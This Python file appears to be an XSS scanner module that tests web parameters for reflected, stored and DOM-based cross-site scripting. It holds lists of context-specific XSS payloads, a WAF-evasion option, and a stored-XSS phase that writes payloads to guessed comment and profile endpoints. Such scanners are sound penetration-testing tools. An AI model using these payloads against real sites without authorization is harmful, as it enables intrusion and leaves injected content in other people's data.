"""Python-native XSS (Cross-Site Scripting) tester.

Detects reflected XSS and DOM-based XSS indicators using:
1. Canary reflection: Inject a unique string with special chars, check if
   it appears unencoded in the response.
2. Payload escalation: If the canary is reflected, try real XSS payloads.
3. DOM sink/source analysis: Scan JavaScript in the response for dangerous
   sinks (innerHTML, document.write) and sources (location.hash, location.search).
"""

from __future__ import annotations

import json
import logging
import random
import re
import string
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from numasec.core.http import create_client

logger = logging.getLogger("numasec.scanners.xss_tester")

# ---------------------------------------------------------------------------
# XSS payloads — ordered from simple to evasive
# ---------------------------------------------------------------------------

ESCALATION_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    "<svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
]

# Context-specific XSS payloads (selected based on where the canary lands)
CONTEXT_PAYLOADS: dict[str, list[str]] = {
    "html_body": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<script>alert(1)</script>",
    ],
    "html_attribute": [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        '" autofocus onfocus="alert(1)',
    ],
    "js_single_quote": [
        "';alert(1)//",
        "'-alert(1)-'",
        "';\nalert(1)//",
    ],
    "js_double_quote": [
        '";alert(1)//',
        '"-alert(1)-"',
    ],
    "js_bare": [
        ";alert(1)//",
        "-alert(1)-",
    ],
    "html_comment": [
        "--><svg onload=alert(1)>",
        "--><img src=x onerror=alert(1)>",
    ],
    "html_tag": [
        " onmouseover=alert(1) x=",
        "><img src=x onerror=alert(1)>",
    ],
}

# ---------------------------------------------------------------------------
# DOM XSS sinks and sources
# ---------------------------------------------------------------------------

DOM_SINKS: list[tuple[str, str]] = [
    (r"\.innerHTML\s*=", "innerHTML assignment"),
    (r"\.outerHTML\s*=", "outerHTML assignment"),
    (r"document\.write\s*\(", "document.write()"),
    (r"document\.writeln\s*\(", "document.writeln()"),
    (r"eval\s*\(", "eval()"),
    (r"setTimeout\s*\(\s*['\"]", "setTimeout() with string"),
    (r"setInterval\s*\(\s*['\"]", "setInterval() with string"),
    (r"Function\s*\(", "Function() constructor"),
    (r"\.insertAdjacentHTML\s*\(", "insertAdjacentHTML()"),
    (r"jQuery\s*\(\s*['\"]<", "jQuery HTML injection"),
    (r"\$\s*\(\s*['\"]<", "jQuery $ HTML injection"),
]

DOM_SOURCES: list[tuple[str, str]] = [
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"location\.pathname", "location.pathname"),
    (r"document\.URL", "document.URL"),
    (r"document\.referrer", "document.referrer"),
    (r"document\.cookie", "document.cookie"),
    (r"window\.name", "window.name"),
    (r"window\.location", "window.location"),
    (r"postMessage\s*\(", "postMessage()"),
]


def _detect_context(html_text: str, canary: str) -> str:
    """Determine the injection context of a reflected canary in the response.

    Looks at the HTML structure around the canary position to determine
    whether it landed in an HTML body, attribute, script block, comment, etc.

    Returns one of: html_body, html_attribute, js_single_quote,
    js_double_quote, js_bare, html_comment, html_tag, not_reflected
    """
    idx = html_text.find(canary)
    if idx == -1:
        return "not_reflected"

    before = html_text[max(0, idx - 500):idx]

    # Inside HTML comment?
    if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
        return "html_comment"

    # Inside <script> tag?
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        # Count unescaped quotes to determine string context
        script_content = before[last_script_open:]
        single_count = script_content.count("'") - script_content.count("\\'")
        double_count = script_content.count('"') - script_content.count('\\"')
        if single_count % 2 == 1:
            return "js_single_quote"
        if double_count % 2 == 1:
            return "js_double_quote"
        return "js_bare"

    # Inside an HTML tag?
    last_open = before.rfind("<")
    last_close = before.rfind(">")
    if last_open > last_close:
        tag_content = before[last_open:]
        # Inside an attribute value?
        if re.search(r'=\s*["\'][^"\']*$', tag_content):
            return "html_attribute"
        return "html_tag"

    return "html_body"


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class XSSVulnerability:
    """A single XSS finding."""

    param: str
    xss_type: str  # "reflected" | "dom_indicator"
    payload: str
    evidence: str
    location: str = "GET"  # "GET" | "POST"
    confidence: float = 0.5


@dataclass
class XSSResult:
    """Complete XSS test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[XSSVulnerability] = field(default_factory=list)
    params_tested: int = 0
    dom_sinks: list[dict[str, str]] = field(default_factory=list)
    dom_sources: list[dict[str, str]] = field(default_factory=list)
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialise to JSON-friendly dict."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "param": v.param,
                    "type": v.xss_type,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "location": v.location,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "params_tested": self.params_tested,
            "dom_sinks": self.dom_sinks,
            "dom_sources": self.dom_sources,
            "duration_ms": round(self.duration_ms, 2),
            "summary": (
                f"{len(self.vulnerabilities)} XSS "
                f"{'vulnerability' if len(self.vulnerabilities) == 1 else 'vulnerabilities'} found"
                if self.vulnerabilities
                else "No XSS found"
            ),
            "next_steps": (
                ["Test stored XSS via POST to write endpoints", "Check DOM XSS in browser"]
                if self.vulnerabilities
                else []
            ),
        }


# ---------------------------------------------------------------------------
# XSS detection engine
# ---------------------------------------------------------------------------


class PythonXSSTester:
    """2-phase XSS tester: canary reflection + payload escalation + DOM analysis.

    Parameters
    ----------
    timeout:
        HTTP request timeout in seconds.
    """

    def __init__(
        self,
        timeout: float = 10.0,
        extra_headers: dict[str, str] | None = None,
        waf_evasion: bool = False,
    ) -> None:
        self.timeout = timeout
        self._extra_headers = extra_headers or {}
        self._waf_evasion = waf_evasion

    async def test(
        self,
        url: str,
        params: list[str] | None = None,
        method: str = "GET",
        body: dict[str, str] | None = None,
    ) -> XSSResult:
        """Run XSS tests against a target URL.

        Args:
            url: Target URL (with or without query parameters).
            params: Specific parameter names to test. ``None`` auto-detects
                from the URL query string and body.
            method: HTTP method (``GET`` or ``POST``).
            body: POST body parameters (for POST method).

        Returns:
            ``XSSResult`` with all discovered vulnerabilities and DOM indicators.
        """
        start = time.monotonic()
        result = XSSResult(target=url)

        # Detect testable parameters
        test_params = self._detect_params(url, params, method, body)
        result.params_tested = len(test_params)

        async with create_client(
            timeout=self.timeout,
            headers=self._extra_headers,
        ) as client:
            # Phase 1+2: Reflected XSS testing per parameter
            for param_name, location in test_params:
                try:
                    vuln = await self._test_reflected(
                        client,
                        url,
                        param_name,
                        location,
                        method,
                        body,
                    )
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                except Exception as exc:
                    logger.warning("XSS test error on param %s: %s", param_name, exc)
                    continue

            # Phase 3: DOM XSS indicator scanning (regex-based, fast)
            await self._scan_dom_xss(client, url, result)

            # Phase 5: Stored XSS — inject into write endpoints, verify on read
            await self._scan_stored_xss(client, url, result)

        # Phase 4: DOM XSS via headless browser (Playwright, if available)
        param_names = [p for p, _loc in test_params]
        if param_names:
            await self._scan_dom_xss_browser(url, param_names, result)

        # DOM indicators count as vulnerable too
        if result.dom_sinks:
            result.vulnerable = True

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "XSS test complete: %s — %d params, %d vulns, %d DOM sinks, %.0fms",
            url,
            result.params_tested,
            len(result.vulnerabilities),
            len(result.dom_sinks),
            result.duration_ms,
        )
        return result

    # ------------------------------------------------------------------
    # Parameter detection
    # ------------------------------------------------------------------

    def _detect_params(
        self,
        url: str,
        explicit_params: list[str] | None,
        method: str,
        body: dict[str, str] | None,
    ) -> list[tuple[str, str]]:
        """Detect testable parameters from URL and body.

        Returns list of ``(param_name, location)`` tuples.
        """
        params: list[tuple[str, str]] = []

        # GET params from query string
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        for p in query_params:
            params.append((p, "GET"))

        # POST body params
        if body:
            for p in body:
                params.append((p, "POST"))

        if explicit_params:
            # Filter to only explicit params if they exist in detected params
            existing = {p for p, _ in params}
            params = [(p, loc) for p, loc in params if p in explicit_params]
            # Add explicit params not found in URL/body as GET params
            for ep in explicit_params:
                if ep not in existing:
                    loc = "POST" if method.upper() == "POST" else "GET"
                    params.append((ep, loc))

        return params

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    async def _send_with_payload(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        payload: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
    ) -> httpx.Response | None:
        """Send a request with the payload injected into a parameter."""
        try:
            if location == "GET":
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                injected_url = urlunparse(parsed._replace(query=new_query))
                return await client.get(injected_url)
            else:
                injected_body = dict(body or {})
                injected_body[param] = payload
                return await client.post(url, data=injected_body)
        except httpx.HTTPError as exc:
            logger.debug("HTTP error for param=%s: %s", param, exc)
            return None

    # ------------------------------------------------------------------
    # Phase 1+2: Reflected XSS (canary + escalation)
    # ------------------------------------------------------------------

    def _generate_canary(self) -> str:
        """Generate a unique canary string with special characters.

        Format: ``numasec_<random>'"<>``
        The special chars test for encoding / escaping of HTML context.
        """
        rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"numasec_{rand}'\"<>"

    async def _test_reflected(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
    ) -> XSSVulnerability | None:
        """Test a parameter for reflected XSS.

        Step 1: Inject canary and check if it is reflected unencoded.
        Step 2: If reflected, try real XSS payloads.
        """
        canary = self._generate_canary()
        resp = await self._send_with_payload(
            client,
            url,
            param,
            canary,
            location,
            method,
            body,
        )
        if resp is None:
            return None

        response_text = resp.text

        # Check if the canary is reflected with special chars intact
        if canary not in response_text:
            return None

        logger.info("Canary reflected in param=%s, escalating payloads", param)

        # Detect injection context and select appropriate payloads
        context = _detect_context(response_text, canary)
        context_specific = CONTEXT_PAYLOADS.get(context, [])

        # Start with context-specific payloads (most likely to succeed),
        # then fall back to generic payloads
        payloads = list(dict.fromkeys(context_specific + list(ESCALATION_PAYLOADS)))
        if self._waf_evasion:
            from numasec.scanners._encoder import PayloadEncoder

            expanded: list[str] = []
            for p in payloads:
                expanded.append(p)
                expanded.extend(PayloadEncoder.xss_variants(p))
            payloads = list(dict.fromkeys(expanded))  # dedupe, preserve order

        for payload in payloads:
            resp = await self._send_with_payload(
                client,
                url,
                param,
                payload,
                location,
                method,
                body,
            )
            if resp is None:
                continue

            # Check if the payload appears in the response unencoded
            if payload in resp.text:
                logger.info(
                    "Reflected XSS confirmed: param=%s payload=%s",
                    param,
                    payload[:50],
                )
                return XSSVulnerability(
                    param=param,
                    xss_type="reflected",
                    payload=payload,
                    evidence=self._extract_evidence(resp.text, payload),
                    location=location,
                    confidence=0.8,
                )

        # Canary reflected but no payload executed — still a finding (partial)
        return XSSVulnerability(
            param=param,
            xss_type="reflected",
            payload=canary,
            evidence=f"Canary string reflected unencoded in response body (param: {param})",
            location=location,
            confidence=0.6,
        )

    @staticmethod
    def _extract_evidence(body: str, payload: str, context: int = 80) -> str:
        """Extract a snippet of the response around the reflected payload."""
        idx = body.find(payload)
        if idx == -1:
            return f"Payload reflected: {payload}"
        start = max(0, idx - context)
        end = min(len(body), idx + len(payload) + context)
        snippet = body[start:end]
        return f"...{snippet}..."

    # ------------------------------------------------------------------
    # Phase 3: DOM XSS indicator scanning
    # ------------------------------------------------------------------

    async def _scan_dom_xss(
        self,
        client: httpx.AsyncClient,
        url: str,
        result: XSSResult,
    ) -> None:
        """Scan the response for DOM XSS sinks and sources.

        Looks for dangerous JavaScript patterns that could lead to
        DOM-based XSS if user-controlled sources flow into sinks.
        """
        try:
            resp = await client.get(url)
            body = resp.text
        except httpx.HTTPError:
            return

        # Check for sinks
        for pattern, description in DOM_SINKS:
            matches = re.finditer(pattern, body)
            for match in matches:
                result.dom_sinks.append(
                    {
                        "sink": description,
                        "pattern": pattern,
                        "evidence": match.group(0)[:100],
                    }
                )

        # Check for sources
        for pattern, description in DOM_SOURCES:
            matches = re.finditer(pattern, body)
            for match in matches:
                result.dom_sources.append(
                    {
                        "source": description,
                        "pattern": pattern,
                        "evidence": match.group(0)[:100],
                    }
                )

        # If both sinks and sources are found, create a DOM indicator vuln
        if result.dom_sinks and result.dom_sources:
            sink_names = ", ".join(s["sink"] for s in result.dom_sinks[:3])
            source_names = ", ".join(s["source"] for s in result.dom_sources[:3])
            result.vulnerabilities.append(
                XSSVulnerability(
                    param="DOM",
                    xss_type="dom_indicator",
                    payload="N/A",
                    evidence=(
                        f"DOM sinks ({sink_names}) and sources ({source_names}) found. Manual verification required."
                    ),
                    confidence=0.3,
                )
            )

    # ------------------------------------------------------------------
    # Phase 5: Stored XSS (inject → verify)
    # ------------------------------------------------------------------

    # Stored XSS targets: (write_path, write_method, write_field, read_path)
    # Generic state-changing endpoints commonly found in web apps
    _STORED_XSS_TARGETS: list[tuple[str, str, str, str]] = [
        ("/api/comments", "POST", "body", "/api/comments"),
        ("/api/posts", "POST", "content", "/api/posts"),
        ("/api/feedback", "POST", "message", "/api/feedback"),
        ("/api/reviews", "POST", "text", "/api/reviews"),
        ("/api/profile", "PUT", "bio", "/api/profile"),
    ]

    _STORED_XSS_PAYLOADS: list[str] = [
        "<script>alert('NUMASEC_STORED')</script>",
        "<img src=x onerror=alert('NUMASEC_STORED')>",
        "<svg onload=alert('NUMASEC_STORED')>",
    ]

    async def _scan_stored_xss(
        self,
        client: httpx.AsyncClient,
        url: str,
        result: XSSResult,
    ) -> None:
        """Phase 5: Stored XSS — inject payloads via write endpoints, verify on read.

        For each target endpoint, POST/PUT an XSS payload into a text field,
        then GET the same resource and check if the payload is rendered unencoded.
        """
        parsed = urlparse(url)
        base_origin = f"{parsed.scheme}://{parsed.netloc}"

        for write_path, method, field_name, read_path in self._STORED_XSS_TARGETS:
            write_url = f"{base_origin}{write_path}"
            read_url = f"{base_origin}{read_path}"

            for payload in self._STORED_XSS_PAYLOADS:
                try:
                    # Inject the payload
                    body: dict[str, Any] = {field_name: payload}

                    if method == "PUT":
                        resp = await client.put(write_url, json=body)
                    else:
                        resp = await client.post(write_url, json=body)

                    if resp.status_code not in (200, 201):
                        continue

                    # Read back and check if the payload is reflected unencoded
                    read_resp = await client.get(read_url)
                    if read_resp.status_code != 200:
                        continue

                    if payload in read_resp.text:
                        result.vulnerabilities.append(
                            XSSVulnerability(
                                param=field_name,
                                xss_type="stored",
                                payload=payload,
                                evidence=(
                                    f"Stored XSS confirmed: {method} {write_path} with "
                                    f"payload in '{field_name}' field, verified on GET {read_path}. "
                                    f"Payload rendered unencoded in response."
                                ),
                                location="POST",
                                confidence=0.9,
                            )
                        )
                        result.vulnerable = True
                        break  # One payload per target is enough
                except httpx.HTTPError:
                    continue

    # ------------------------------------------------------------------
    # Phase 4: DOM XSS via headless browser (Playwright)
    # ------------------------------------------------------------------

    # Extended payload set for browser-based DOM XSS testing
    _BROWSER_DOM_PAYLOADS: list[str] = [
        "<img src=x onerror=alert('NUMASEC_XSS')>",
        "<iframe src=\"javascript:alert('NUMASEC_XSS')\">",
        "<svg onload=alert('NUMASEC_XSS')>",
        "<details open ontoggle=alert('NUMASEC_XSS')>",
    ]

    async def _scan_dom_xss_browser(
        self,
        url: str,
        params: list[str],
        result: XSSResult,
    ) -> None:
        """Use Playwright to detect actual DOM XSS via dialog + error monitoring.

        Handles three URL shapes:
        1. **Query params**: ``/search?q=PAYLOAD`` — standard injection
        2. **Fragment params**: ``/#/search?q=PAYLOAD`` — SPA route injection
        3. **Bare fragment**: ``/#/PAYLOAD`` — direct fragment injection

        Multiple payloads are tested per parameter (img, iframe, svg, details).
        If Playwright is not installed, silently returns.

        Args:
            url: Target URL to test.
            params: Parameter names to inject into.
            result: ``XSSResult`` to append findings to.
        """
        try:
            from playwright.async_api import async_playwright
        except ImportError:
            logger.debug("Playwright not available — skipping browser DOM XSS scan")
            return

        parsed = urlparse(url)

        # Build list of (param_name, url_builder) tuples to test
        test_targets = self._build_browser_test_targets(url, parsed, params)
        if not test_targets:
            return

        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()

                for param_name, build_url in test_targets:
                    for payload in self._BROWSER_DOM_PAYLOADS:
                        test_url = build_url(payload)
                        confirmed = await self._browser_probe_xss(page, test_url)

                        if confirmed:
                            logger.info("Browser DOM XSS confirmed: param=%s payload=%s", param_name, payload[:50])
                            result.vulnerabilities.append(
                                XSSVulnerability(
                                    param=param_name,
                                    xss_type="dom_xss",
                                    payload=payload,
                                    evidence=(
                                        f"JavaScript dialog fired after injecting payload into "
                                        f"parameter '{param_name}' via headless browser. "
                                        f"URL: {test_url[:200]}"
                                    ),
                                    location="GET",
                                    confidence=1.0,
                                )
                            )
                            result.vulnerable = True
                            break  # One confirmed payload per param is enough

                await browser.close()
        except Exception as exc:
            logger.debug("Browser DOM XSS scan error: %s", exc)

    @staticmethod
    def _build_browser_test_targets(
        url: str,
        parsed: Any,
        params: list[str],
    ) -> list[tuple[str, Any]]:
        """Build URL-builder functions for query params and fragment params.

        Returns list of ``(param_name, build_url_fn)`` tuples where
        ``build_url_fn(payload)`` returns a test URL with the payload injected.
        """
        targets: list[tuple[str, Any]] = []

        # Strategy 1: Standard query params (e.g., /search?q=PAYLOAD)
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for pname in params:
                if pname in query_params:

                    def _build_query(payload: str, _p: str = pname, _qp: dict = dict(query_params)) -> str:  # noqa: B006
                        modified = dict(_qp)
                        modified[_p] = [payload]
                        new_query = urlencode(modified, doseq=True)
                        return urlunparse(parsed._replace(query=new_query))

                    targets.append((pname, _build_query))

        # Strategy 2: Fragment-based SPA params (e.g., /#/search?q=PAYLOAD)
        fragment = parsed.fragment
        if fragment and "?" in fragment:
            frag_path, frag_query = fragment.split("?", 1)
            frag_params = parse_qs(frag_query, keep_blank_values=True)
            base_url = urlunparse(parsed._replace(fragment=""))

            for pname in list(frag_params.keys()) + params:
                if pname in frag_params or pname in params:

                    def _build_frag(
                        payload: str,
                        _p: str = pname,
                        _fp: str = frag_path,
                        _fqp: dict = dict(frag_params),  # noqa: B006
                        _base: str = base_url,
                    ) -> str:
                        modified = dict(_fqp)
                        modified[_p] = [payload]
                        new_frag_query = urlencode(modified, doseq=True)
                        return f"{_base}#{_fp}?{new_frag_query}"

                    targets.append((pname, _build_frag))

        # Strategy 3: Fragment route with no query but known param names
        # e.g., /#/search — inject as /#/search?q=PAYLOAD
        if fragment and "?" not in fragment and not targets:
            base_url = urlunparse(parsed._replace(fragment=""))
            common_params = params if params else ["q", "id", "search", "query"]

            for pname in common_params:

                def _build_frag_inject(
                    payload: str, _p: str = pname, _frag: str = fragment, _base: str = base_url
                ) -> str:
                    return f"{_base}#{_frag}?{urlencode({_p: payload})}"

                targets.append((pname, _build_frag_inject))

        return targets

    @staticmethod
    async def _browser_probe_xss(page: Any, test_url: str) -> bool:
        """Navigate to a URL and check if a JS dialog fires."""
        import asyncio

        dialog_fired = False

        def on_dialog(dialog: Any) -> None:
            nonlocal dialog_fired
            if "NUMASEC_XSS" in (dialog.message or ""):
                dialog_fired = True
            asyncio.ensure_future(dialog.dismiss())

        page.on("dialog", on_dialog)
        try:
            await page.goto(test_url, timeout=10000, wait_until="load")
            await page.wait_for_timeout(2000)
        except Exception:
            logger.debug("Browser DOM XSS: navigation error for %s", test_url[:100])
        finally:
            page.remove_listener("dialog", on_dialog)

        return dialog_fired


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_xss_test(
    url: str,
    params: str | None = None,
    method: str = "GET",
    headers: str = "",
    waf_evasion: bool = False,
) -> str:
    """Run XSS tests against a URL.

    Supports both standard query parameters and SPA fragment parameters
    (e.g., ``/#/search?q=test``). If Playwright is installed, also tests
    for DOM XSS via headless browser dialog monitoring.

    Args:
        url: Target URL with query parameters to test.
        params: Comma-separated parameter names. Auto-detect if omitted.
        method: HTTP method (``GET`` or ``POST``).
        headers: JSON string of extra HTTP headers for authenticated testing,
            e.g. ``'{"Authorization": "Bearer token123"}'``. Default: ``""``.
        waf_evasion: Enable WAF bypass encoding for payloads. Default: ``False``.

    Returns:
        JSON string with ``XSSResult`` data.
    """
    param_list: list[str] | None = params.split(",") if params else None
    extra_headers: dict[str, str] = headers if isinstance(headers, dict) else (json.loads(headers) if headers else {})

    # Auto-detect params from URL fragment for SPAs (e.g., /#/search?q=test)
    parsed = urlparse(url)
    if parsed.fragment and "?" in parsed.fragment:
        _frag_path, frag_query = parsed.fragment.split("?", 1)
        frag_params = parse_qs(frag_query, keep_blank_values=True)
        if frag_params and not param_list:
            param_list = list(frag_params.keys())

    tester = PythonXSSTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
    result = await tester.test(url, params=param_list, method=method)
    return json.dumps(result.to_dict(), indent=2)
